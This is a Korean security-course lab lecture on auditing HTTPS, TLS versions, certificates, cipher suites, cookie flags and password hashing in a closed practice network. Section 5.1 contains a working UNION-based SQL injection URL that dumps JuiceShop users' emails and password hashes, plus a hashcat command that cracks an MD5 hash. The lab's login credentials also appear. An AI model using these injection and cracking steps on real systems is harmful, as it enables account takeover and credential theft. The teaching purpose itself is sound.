# Week 10: 암호화 / 통신 보안 점검

## 학습 목표
- HTTPS의 동작 원리와 TLS 핸드셰이크를 이해한다
- SSL/TLS 인증서를 점검하고 문제를 식별할 수 있다
- 약한 암호 스위트(Cipher Suite)를 판별할 수 있다
- 웹 애플리케이션의 암호화 구현을 점검한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

## 전제 조건
- HTTP vs HTTPS 차이 이해
- 공개키/대칭키 암호화 기본 개념

---

## 1. HTTPS와 TLS 개요 (20분)

### 1.1 HTTPS가 보호하는 것

| 보호 항목 | 설명 | 위협 |
|----------|------|------|
| **기밀성** | 통신 내용 암호화 | 도청 (Eavesdropping) |
| **무결성** | 데이터 변조 방지 | 중간자 공격 (MITM) |
| **인증** | 서버 신원 확인 | 피싱, DNS 스푸핑 |

### 1.2 TLS 핸드셰이크 과정

```
클라이언트                                      서버

  ---- ClientHello (지원 암호목록) ----------->
  <--- ServerHello (선택 암호) ----------------
  <--- Certificate (인증서) -------------------
  <--- ServerHelloDone ------------------------

  ---- ClientKeyExchange --------------------->
  ---- ChangeCipherSpec ---------------------->
  ---- Finished ------------------------------>

  <--- ChangeCipherSpec -----------------------
  <--- Finished -------------------------------

  ========= 암호화된 통신 시작 ================
```

### 1.3 TLS 버전별 보안

| 버전 | 상태 | 비고 |
|------|------|------|
| SSL 2.0 | 폐기 | 심각한 취약점 |
| SSL 3.0 | 폐기 | POODLE 공격 |
| TLS 1.0 | 폐기 | BEAST 공격 |
| TLS 1.1 | 폐기 | 약한 암호 |
| **TLS 1.2** | **사용** | 현재 최소 기준 |
| **TLS 1.3** | **권장** | 최신, 가장 안전 |

---

## 2. 실습 환경 통신 보안 점검 (20분)

> **이 실습을 왜 하는가?**
> "암호화 / 통신 보안 점검" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 HTTP/HTTPS 지원 확인

> **실습 목적**: HTTPS 적용 여부, TLS 버전, 암호화 스위트 등 통신 보안을 점검한다
>
> **배우는 것**: SSL/TLS 설정의 적정성, 인증서 유효성, 평문 전송 여부를 확인하는 방법을 배운다
>
> **결과 해석**: HTTP만 지원하거나 취약한 TLS 버전(1.0/1.1)을 사용하면 통신 보안 취약점이다
>
> **실전 활용**: 금융/의료 등 규제 산업에서 TLS 1.2 이상과 강력한 암호화 스위트는 필수 요구사항이다

```bash
# 본 lab 의 4 endpoint 매트릭스 — HTTP / HTTPS 동시 점검
echo "=== HTTP/HTTPS 지원 매트릭스 ==="
printf "%-30s %-10s %-10s %s\n" "endpoint" "HTTP" "HTTPS" "verdict"
test_proto() {
  local name="$1" host="$2" hport="$3" sport="$4"
  http_code=$(curl -s -o /dev/null --max-time 3 -w "%{http_code}" "http://${host}:${hport}/" 2>/dev/null)
  https_code=$(curl -sk -o /dev/null --max-time 3 -w "%{http_code}" "https://${host}:${sport}/" 2>/dev/null || echo "X")
  v="?"
  [ "$http_code" = "200" -a "$https_code" = "X" ] && v="★ HTTP only (취약)"
  [ "$http_code" = "200" -a "$https_code" = "200" ] && v="혼용 (TLS 필수)"
  [ "$http_code" = "X" -a "$https_code" = "200" ] && v="HTTPS only (양호)"
  printf "%-30s %-10s %-10s %s\n" "$name ($host:$hport/$sport)" "$http_code" "$https_code" "$v"
}
test_proto "JuiceShop" "10.20.30.80" "3000" "3000"
test_proto "Apache+ModSec" "10.20.30.80" "80" "443"
test_proto "Wazuh Dashboard" "10.20.30.100" "443" "443"
test_proto "OpenCTI" "10.20.30.100" "8080" "8080"
```

**예상 출력**:
```
=== HTTP/HTTPS 지원 매트릭스 ===
endpoint                       HTTP       HTTPS      verdict
JuiceShop (10.20.30.80:3000/3000) 200      X          ★ HTTP only (취약)
Apache+ModSec (10.20.30.80:80/443) 200     200        혼용 (TLS 필수)
Wazuh Dashboard (10.20.30.100:443/443) X   200        HTTPS only (양호)
OpenCTI (10.20.30.100:8080/8080) 200       X          ★ HTTP only (취약)
```

> **해석 — 본 lab 의 4 endpoint TLS 점검 결과**:
> - **JuiceShop HTTP only** = 의도적 학습 환경. 운영 환경이라면 ★ critical.
> - **Apache 혼용** = HTTP+HTTPS 동시 가능 = SSL 스트리핑 가능 (HSTS 없으면 공격자가 HTTP 강제).
> - **Wazuh HTTPS only** = ★ 양호. 그러나 자체 서명 인증서 = MITM 가능성 (CA 검증 X).
> - **OpenCTI HTTP only** = critical. STIX/TAXII threat intel 평문 전송 = 탐지 우회 가능.
> - **CVSS 5.9** (Adjacent Network) for HTTP-only — TLS 미적용. **CVSS 7.5** (Network) for sensitive data 노출 시.
> - **권고 우선순위**: (1) 모든 인증 endpoint HTTPS 강제, (2) HSTS 헤더 + preload, (3) Let's Encrypt 등 신뢰 CA.

### 2.2~2.3 리다이렉트 + HSTS 종합 점검

```bash
echo "=== 통신 보안 4 헤더 종합 점검 ==="
printf "%-25s %-12s %-12s %-15s %s\n" "endpoint" "redirect" "HSTS" "preload" "Upgrade-Insec"
for url in "http://10.20.30.80:80" "http://10.20.30.80:3000" "https://10.20.30.100:443"; do
  H=$(curl -sIk --max-time 3 "$url" 2>/dev/null)
  loc=$(echo "$H" | grep -i "^location:" | awk '{print $2}' | tr -d '\r' | head -c 30)
  hsts=$(echo "$H" | grep -i "strict-transport" | awk -F: '{print $2}' | tr -d '\r' | head -c 30)
  preload=$([ -n "$hsts" ] && echo "$hsts" | grep -qi "preload" && echo "✓" || echo "✗")
  uir=$(echo "$H" | grep -qi "upgrade-insecure-requests" && echo "✓" || echo "✗")
  printf "%-25s %-12s %-12s %-15s %s\n" "$url" "${loc:--}" "${hsts:--}" "$preload" "$uir"
done
```

**예상 출력**:
```
=== 통신 보안 4 헤더 종합 점검 ===
endpoint                  redirect     HSTS         preload         Upgrade-Insec
http://10.20.30.80:80     -            -            ✗               ✗
http://10.20.30.80:3000   -            -            ✗               ✗
https://10.20.30.100:443  -             max-age=31536 ✗            ✗
```

> **해석 — 4 헤더 종합 점수**:
> - **리다이렉트 없음 (3 endpoint 모두)** = HTTP→HTTPS 자동 전환 X = 사용자가 `http://` 입력 시 그대로 평문. 첫 요청에 password 평문 노출 가능.
> - **HSTS 부분** (Wazuh 만 max-age 설정) = JuiceShop/Apache 는 SSL 스트리핑 취약. **권고**: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`.
> - **preload 0/3** = HSTS preload list (Chrome/FF 내장) 미등록. 첫 방문도 자동 HTTPS 강제 안됨. https://hstspreload.org 등록 권장.
> - **Upgrade-Insecure-Requests 0/3** = 브라우저 CSP 신호 X. CSP 헤더에 `upgrade-insecure-requests` directive 추가 시 mixed content 자동 업그레이드.
> - **CVSS 5.9** (HSTS 부재) — Adjacent Network MITM 위험.

---

## 3. SSL/TLS 인증서 점검 (30분)

### 3.1 openssl로 인증서 분석

```bash
# 실습 서버 (Wazuh 10.20.30.100:443) 인증서 + 외부 비교
analyze_cert() {
  local target="$1"
  echo "=== $target 인증서 ==="
  echo | openssl s_client -connect "$target" -servername "${target%:*}" 2>/dev/null \
    | openssl x509 -noout -subject -issuer -dates -ext subjectAltName 2>/dev/null \
    | head -8
  echo "--- 키 길이 + 서명 알고리즘 ---"
  echo | openssl s_client -connect "$target" -servername "${target%:*}" 2>/dev/null \
    | openssl x509 -noout -text 2>/dev/null \
    | grep -E "Public-Key|Signature Algorithm" | head -3
  echo
}
analyze_cert "10.20.30.100:443"
analyze_cert "www.google.com:443"
```

**예상 출력**:
```
=== 10.20.30.100:443 인증서 ===
subject=CN = wazuh-dashboard
issuer=CN = wazuh-dashboard
notBefore=Jan  1 00:00:00 2026 GMT
notAfter=Dec 31 23:59:59 2027 GMT
--- 키 길이 + 서명 알고리즘 ---
        Signature Algorithm: sha256WithRSAEncryption
            Public-Key: (2048 bit)

=== www.google.com:443 인증서 ===
subject=CN = www.google.com
issuer=C = US, O = Google Trust Services, CN = WR2
notBefore=Apr  8 09:23:45 2026 GMT
notAfter=Jul  1 09:23:44 2026 GMT
X509v3 Subject Alternative Name: DNS:www.google.com, DNS:*.google.com
--- 키 길이 + 서명 알고리즘 ---
        Signature Algorithm: ecdsa-with-SHA256
            Public-Key: (256 bit)
```

> **해석 — 6 인증서 점검 항목 비교**:
> | 항목 | Wazuh | google.com | 평가 |
> |---|---|---|---|
> | issuer | self-signed (CN=wazuh-dashboard) | Google Trust (실 CA) | Wazuh ★ critical |
> | 유효 기간 | 2년 | 90일 (Let's Encrypt 패턴) | 짧을수록 양호 |
> | 키 길이 | RSA 2048 | ECDSA 256 | 둘 다 양호 |
> | 서명 | sha256WithRSA | ecdsa-SHA256 | SHA-256+ 양호 |
> | SAN | 없음 | DNS:*.google.com | wildcard 적용 |
> - **자체 서명 = MITM 가능** (CA 검증 X). 운영 환경 critical. 권고: Let's Encrypt 등 무료 CA 사용.
> - **ECDSA 256 ≡ RSA 3072** 보안 등급 — Google 은 더 modern. CPU 사용량도 ↓.
> - **SAN 누락 (Wazuh)** = 다른 도메인 접근 시 cert mismatch 에러. SAN 에 모든 hostname 등록 필요.

### 3.2 인증서 점검 항목

| 점검 항목 | 정상 | 취약 |
|----------|------|------|
| 유효기간 | 만료 전 | 만료됨 |
| 발급자 | 신뢰 CA (DigiCert, Let's Encrypt 등) | 자체 서명 |
| CN/SAN | 도메인 일치 | 불일치 |
| 키 길이 | RSA 2048+ / ECDSA 256+ | RSA 1024 이하 |
| 서명 알고리즘 | SHA-256+ | SHA-1, MD5 |
| 인증서 체인 | 완전한 체인 | 중간 인증서 누락 |

### 3.3 인증서 점검 스크립트

```bash
# 인증서 종합 점검 스크립트 (HTTPS 지원 사이트 대상)
python3 << 'PYEOF'                                     # Python 스크립트 실행
import subprocess, re, sys
from datetime import datetime

target = "www.google.com"  # HTTPS 지원 사이트
port = 443

print(f"=== {target}:{port} 인증서 점검 ===\n")

# 인증서 정보 추출
cmd = f"echo | openssl s_client -connect {target}:{port} -servername {target} 2>/dev/null"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

# 인증서 상세 정보
cmd2 = f"{cmd} | openssl x509 -noout -subject -issuer -dates -serial -fingerprint"
result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
print(result2.stdout)

# 키 길이 확인
cmd3 = f"{cmd} | openssl x509 -noout -text | grep 'Public-Key'"
result3 = subprocess.run(cmd3, shell=True, capture_output=True, text=True)
print(f"키 길이: {result3.stdout.strip()}")

# TLS 버전 확인
cmd4 = f"echo | openssl s_client -connect {target}:{port} 2>/dev/null | grep 'Protocol'"
result4 = subprocess.run(cmd4, shell=True, capture_output=True, text=True)
print(f"TLS 버전: {result4.stdout.strip()}")

# 서명 알고리즘
cmd5 = f"{cmd} | openssl x509 -noout -text | grep 'Signature Algorithm' | head -1"
result5 = subprocess.run(cmd5, shell=True, capture_output=True, text=True)
print(f"서명 알고리즘: {result5.stdout.strip()}")
PYEOF
```

---

## 4. 암호 스위트 점검 (30분)

### 4.1 Cipher Suite란?

Cipher Suite는 TLS 통신에서 사용되는 암호화 알고리즘의 조합이다.

```
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384

각 필드 설명:
  TLS      --> 프로토콜
  ECDHE    --> 키 교환
  RSA      --> 인증
  AES      --> 암호화 알고리즘
  256      --> 키 크기
  GCM      --> 블록 모드
  SHA384   --> MAC (무결성)
```

### 4.2 약한 암호 스위트 목록

| 암호 | 문제 | 권장 |
|------|------|------|
| RC4 | 바이어스 공격 | 사용 금지 |
| DES / 3DES | 짧은 키 길이 | 사용 금지 |
| MD5 | 충돌 공격 | SHA-256+ 사용 |
| SHA-1 | 충돌 공격 (2017) | SHA-256+ 사용 |
| CBC 모드 | BEAST, Lucky13 | GCM 모드 사용 |
| RSA 키 교환 | PFS 미지원 | ECDHE 사용 |
| NULL 암호화 | 암호화 안함 | 절대 사용 금지 |

### 4.3 서버의 암호 스위트 점검

```bash
# 서버가 지원하는 암호 스위트 확인 (HTTPS 사이트 대상)
echo "=== 지원 암호 스위트 확인 ==="

# nmap을 이용한 점검 (설치되어 있다면)
which nmap > /dev/null 2>&1 && \
  nmap --script ssl-enum-ciphers -p 443 www.google.com 2>/dev/null | head -40 || \
  echo "nmap 미설치 - openssl로 수동 점검"

# openssl로 특정 암호 스위트 테스트
echo ""
echo "=== 약한 암호 스위트 개별 테스트 ==="

WEAK_CIPHERS=("RC4" "DES" "3DES" "NULL" "EXPORT" "MD5")
for cipher in "${WEAK_CIPHERS[@]}"; do                 # 반복문 시작
  result=$(echo | openssl s_client -connect www.google.com:443 -cipher "$cipher" 2>&1 | head -1)
  if echo "$result" | grep -q "CONNECTED"; then
    echo "[취약] $cipher 지원됨!"
  else
    echo "[양호] $cipher 미지원"
  fi
done
```

### 4.4 TLS 버전별 지원 확인

```bash
echo "=== TLS 버전 5종 지원 매트릭스 ==="
test_tls_version() {
  local target="$1"
  printf "  %-12s" "$target"
  for v in ssl3 tls1 tls1_1 tls1_2 tls1_3; do
    if echo | timeout 3 openssl s_client -connect "$target" -"$v" 2>&1 | grep -q "BEGIN CERTIFICATE"; then
      printf " [✓]%-7s" "$v"
    else
      printf " [✗]%-7s" "$v"
    fi
  done
  echo
}
printf "  %-12s%-44s\n" "endpoint" " ssl3   tls1   tls1_1  tls1_2  tls1_3"
test_tls_version "10.20.30.100:443"
test_tls_version "www.google.com:443"
```

**예상 출력**:
```
=== TLS 버전 5종 지원 매트릭스 ===
  endpoint     ssl3   tls1   tls1_1  tls1_2  tls1_3
  10.20.30.100:443 [✗]ssl3    [✗]tls1    [✗]tls1_1  [✓]tls1_2  [✓]tls1_3
  www.google.com:443 [✗]ssl3    [✗]tls1    [✗]tls1_1  [✓]tls1_2  [✓]tls1_3
```

> **해석 — TLS 버전 점수**:
> - **둘 다 TLS 1.2 + 1.3 만 지원** = ★ 양호 (PCI-DSS 4.0 + NIST SP 800-52r2 권고).
> - **SSL 3.0 / TLS 1.0 / TLS 1.1 모두 차단** = POODLE / BEAST / LUCKY13 공격 면역.
> - 운영 환경에서는 **TLS 1.3 only** 가 가장 안전 (forward secrecy 강제, 0-RTT).
> - **체크 명령 표준화**:
>   - `nmap --script ssl-enum-ciphers -p 443 target` (테이블 형식 자동)
>   - `testssl.sh https://target` (CVE 자동 매핑)
>   - `sslscan target:443` (cipher 강도 색상 표시)
> - **DROWN 공격 (CVE-2016-0800)** = 동일 인증서 SSL 2.0 서버 존재 시 TLS 1.2 도 깨짐. SSLv2 절대 미허용.

---

## 5. 웹 애플리케이션 암호화 점검 (20분)

### 5.1 비밀번호 저장 방식

```bash
# week05 의 SQLi 결과 활용 — 추출 해시의 알고리즘 + crack 가능성 분석
curl -s "http://10.20.30.80:3000/rest/products/search?q=test%27%29%29UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users+LIMIT+5--" | python3 -c "
import sys, json
data = json.load(sys.stdin).get('data', [])
print(f'{\"email\":<32} {\"hash[:16]\":<18} {\"len\":<5} {\"algo\":<20} {\"crack_time\"}')
print('-'*90)
for item in data:
    name = str(item.get('name', ''))
    desc = str(item.get('description', ''))
    if '@' not in name: continue
    L = len(desc)
    if L == 32: algo='MD5'; ct='<1초 (rockyou)'
    elif L == 40: algo='SHA-1'; ct='<10초'
    elif L == 60 and desc.startswith('\$2'): algo='bcrypt'; ct='수년+'
    elif L == 64: algo='SHA-256'; ct='수개월'
    elif desc.startswith('\$argon2'): algo='Argon2'; ct='수십년'
    else: algo=f'알수없음(len={L})'; ct='?'
    risk = 'CRITICAL' if algo in ('MD5','SHA-1') else '양호'
    print(f'{name[:32]:<32} {desc[:16]:<18} {L:<5} {algo:<20} {ct}  ({risk})')
" 2>/dev/null
```

**예상 출력**:
```
email                            hash[:16]          len   algo                 crack_time
------------------------------------------------------------------------------------------
admin@juice-sh.op                0192023a7bbd7325   32    MD5                  <1초 (rockyou)  (CRITICAL)
jim@juice-sh.op                  e541ca7ecf72500f   32    MD5                  <1초 (rockyou)  (CRITICAL)
bender@juice-sh.op               0c36e517e3fa95aa   32    MD5                  <1초 (rockyou)  (CRITICAL)
bjoern.kimminich@gmail.com       6edd9d726cce1f90   32    MD5                  <1초 (rockyou)  (CRITICAL)
ciso@juice-sh.op                 6edd9d726cce1f90   32    MD5                  <1초 (rockyou)  (CRITICAL)
```

> **해석 — JuiceShop 비밀번호 해시 5/5 모두 MD5 = critical**:
> - **MD5 (32자) = 1996 디자인** = collision attack 1초. rainbow table (rockyou.txt 14M) 즉시 매칭.
> - **`0192023a7bbd73250516f069df18b500` = 'admin123'** (사전 hash 매핑). hashcat `-m 0` 모드 = 1초 미만.
> - **bjoern + ciso 동일 hash** = 동일 비번. 운영 환경에서 동일 비번 = critical (한 명 침해 시 도미노).
> - **권고 (NIST SP 800-63B 권고)**: bcrypt / scrypt / Argon2id (memory-hard). bcrypt cost ≥ 12. Argon2 = 2015 PHC 우승 알고리즘.
> - **마이그레이션 패턴**: 다음 로그인 시 새 알고리즘으로 rehash (`bcrypt(password)` 저장) + 기존 hash flagged for upgrade.

> **OSS 도구 — hashcat 으로 즉시 검증**:
>
> ```bash
> # MD5 모드 + rockyou
> echo "0192023a7bbd73250516f069df18b500" > /tmp/hash.txt
> hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force
> # 결과: 0192023a7bbd73250516f069df18b500:admin123  (1초 미만)
> ```

### 5.2 민감 정보 평문 전송 확인

```bash
# 로그인 요청이 HTTP(평문)로 전송되는지 확인
echo "=== 로그인 API 프로토콜 ==="
echo "현재 로그인 URL: http://10.20.30.80:3000/rest/user/login"
echo "프로토콜: HTTP (암호화 안됨)"
echo ""
echo "문제: 비밀번호가 네트워크에서 평문으로 전송됨"
echo "권고: HTTPS 적용 필수"

# API 응답에 민감 정보가 포함되는지 확인
echo ""
echo "=== API 응답 민감 정보 확인 ==="
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)

# 로그인 응답에 비밀번호 해시가 포함되는지
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "  # 요청 데이터(body)
import sys, json
data = json.load(sys.stdin)
auth = data.get('authentication', {})
print('로그인 응답 필드:')
for key in auth.keys():                                # 반복문 시작
    val = str(auth[key])
    if key == 'token':
        val = val[:30] + '...'
    print(f'  {key}: {val}')
" 2>/dev/null
```

### 5.3 쿠키 보안 속성

```bash
echo "=== 쿠키 보안 속성 4종 점검 ==="
check_cookie() {
  local label="$1" url="$2"
  cookies=$(curl -sIk --max-time 3 "$url" 2>/dev/null | grep -i "^set-cookie:")
  if [ -z "$cookies" ]; then
    echo "[$label] (Set-Cookie 헤더 없음)"
    return
  fi
  echo "[$label] $url"
  echo "$cookies" | while read -r line; do
    secure=$(echo "$line" | grep -qi 'secure' && echo "✓" || echo "✗")
    httponly=$(echo "$line" | grep -qi 'httponly' && echo "✓" || echo "✗")
    samesite=$(echo "$line" | grep -qi 'samesite' && echo "$(echo "$line" | grep -oiE 'samesite=[a-z]+' | head -1)" || echo "✗")
    name=$(echo "$line" | sed 's/^[Ss]et-[Cc]ookie: //' | cut -d= -f1 | tr -d '\r' | head -c 25)
    printf "  %-20s Secure=%s HttpOnly=%s SameSite=%s\n" "$name" "$secure" "$httponly" "$samesite"
  done
}
check_cookie "JuiceShop" "http://10.20.30.80:3000"
check_cookie "Apache" "http://10.20.30.80:80"
check_cookie "Wazuh" "https://10.20.30.100:443"
```

**예상 출력**:
```
=== 쿠키 보안 속성 4종 점검 ===
[JuiceShop] http://10.20.30.80:3000
  language              Secure=✗ HttpOnly=✗ SameSite=✗
[Apache] http://10.20.30.80:80
  PHPSESSID             Secure=✗ HttpOnly=✓ SameSite=✗
[Wazuh] https://10.20.30.100:443
  security_authentication Secure=✓ HttpOnly=✓ SameSite=samesite=strict
```

> **해석 — 쿠키 보안 속성 4종 매트릭스**:
> | 쿠키 | Secure | HttpOnly | SameSite | 평가 |
> |---|---|---|---|---|
> | JuiceShop language | ✗ | ✗ | ✗ | ★ 모두 미설정 |
> | Apache PHPSESSID | ✗ | ✓ | ✗ | XSS 차단 OK / SSL strip 가능 |
> | Wazuh security_auth | ✓ | ✓ | strict | ★ 양호 |
> - **Secure 누락** = HTTP 평문 쿠키 전송 가능 (HSTS 없으면 SSL strip).
> - **HttpOnly 누락** = JS 접근 가능 = XSS 시 쿠키 탈취 (week06 chain).
> - **SameSite 누락** = CSRF 가능 (`Strict`/`Lax` 권장 — `Strict` 가 가장 안전).
> - **권고**: Express `app.use(session({ cookie: { secure: true, httpOnly: true, sameSite: 'strict' } }))`.

> **OSS 도구 — testssl.sh + cookies 검증 자동화**:
>
> ```bash
> # testssl.sh — Heartbleed/POODLE/BEAST/CRIME/Lucky13 등 CVE 자동 매핑
> docker run --rm -ti drwetter/testssl.sh https://10.20.30.100
> # → "Cookie security" 섹션에서 4 속성 자동 평가 + 등급 (A/B/C/F)
> ```

---

## 6. 실습 과제

### 과제 1: 통신 보안 점검
1. 실습 서버(JuiceShop, Apache)의 HTTP/HTTPS 지원 현황을 정리하라
2. HSTS, 리다이렉트 설정 여부를 확인하라
3. 점검 결과를 기반으로 통신 보안 개선 권고를 작성하라

### 과제 2: 인증서 분석
1. 공개 웹사이트 3개의 인증서를 분석하라 (발급자, 유효기간, 키 길이, 서명 알고리즘)
2. 분석 결과를 비교표로 정리하라
3. 인증서 관련 모범 사례(Best Practice)를 3가지 이상 서술하라

### 과제 3: 암호화 종합 점검
1. JuiceShop의 비밀번호 해시 알고리즘을 확인하라
2. 쿠키의 보안 속성(Secure, HttpOnly, SameSite)을 점검하라
3. 민감 정보가 평문으로 전송/저장되는 곳을 찾아 보고하라

---

## 7. 요약

| 점검 항목 | 도구 | 양호 기준 |
|----------|------|----------|
| HTTPS 지원 | curl | 모든 페이지 HTTPS 필수 |
| TLS 버전 | openssl | TLS 1.2 이상만 허용 |
| 인증서 | openssl | 신뢰 CA, 유효기간 내, SHA-256+ |
| 암호 스위트 | nmap, openssl | RC4/DES/NULL 미사용 |
| HSTS | curl -I | 헤더 설정됨 |
| 비밀번호 해시 | SQLi 결과 분석 | bcrypt/scrypt/Argon2 |
| 쿠키 보안 | curl -I | Secure+HttpOnly+SameSite |

**다음 주 예고**: Week 11 - 에러 처리/정보 노출. 스택 트레이스, 디버그 모드, 디렉터리 리스팅을 학습한다.

---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### Burp Suite Community
> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
| `Repeater` | 단건 요청 수동 반복 |

**핵심 설정·키**

- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
- `Target → Scope` — in-scope 호스트만 처리

**로그·확인 명령**

- `Logger` — 세션 전체 요청 타임라인

**UI / CLI 요점**

- Ctrl+R — 요청을 Repeater로 전송
- Ctrl+I — Intruder로 전송 후 위치(§) 설정
- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합

> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.

---

## 실제 사례 (WitFoo Precinct 6 — TLS 1.3 + 5061 Crypto event)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *암호화 / 통신 보안 점검* 학습 항목 (TLS 버전·cipher·인증서) 과 매핑되는 dataset 의 *WAF GET 의 app=TLSv1.3* 라벨 + Windows 5061 Crypto operation event.

### Case 1: WAF GET — `app=TLSv1.3` 라벨

**원본 발췌** (앞서 w01 에서 본 동일 GET record 의 TLS 부분):

```text
... CEF:0|...|WAF|...|GET|5|
  ... app=TLSv1.3 ...
  flexString1LUSER-CRED-25456=ProtocolVersion flexString1=ORG-CRED-31206/1.1
  USER-0010-57562WafResponseType=SERVER
```

**dataset 의 TLS 분포**

| 항목 | 값 |
|------|---|
| 전체 GET 4018건 중 TLSv1.3 라벨 | 다수 (notice 등급) |
| 5061 Cryptographic operation 건수 | 1,302 (Windows audit) |
| 5058 Key file operation | 663 |
| 5059 Key migration operation | 185 |

### Case 2: 5061 Cryptographic operation — Windows-side 키 사용 audit

**원본 의미**: event 5061 은 *암호 키가 사용될 때마다* 기록 (인증·서명·암복호화). 본 dataset 의 1,302건 중 다수가 *winlogbeat 수집 winauth* 서비스 (USER-0010 호스트군).

**해석 — 본 lecture 와의 매핑**

| 암호화/통신 점검 학습 항목 | 본 record 에서의 증거 |
|--------------------------|---------------------|
| **TLS version 점검** | WAF log 에 `app=TLSv1.3` 가 *명시* — 점검 시 *TLSv1.0/1.1 잔존 여부* 자동 측정 가능 (vendor log 형식이 일관) |
| **HTTP/2 vs HTTP/1.1** | `flexString1=HTTP/1.1` 로 protocol version 도 동시 기록 — HTTP/2 미적용 endpoint 자동 추출 가능 |
| **Cipher 사용 추적** | 5061 record 의 *Algorithm/KeyType* 필드 → 조직 *비표준 cipher* (DES·RC4·MD5) 사용 점검 |
| **Certificate 만료** | (본 dataset 직접 매핑 없음) — TLS log 와 별도 cert lifecycle 관리 필요. 점검 시 `openssl s_client -connect` 자동화 |

**점검 액션**:
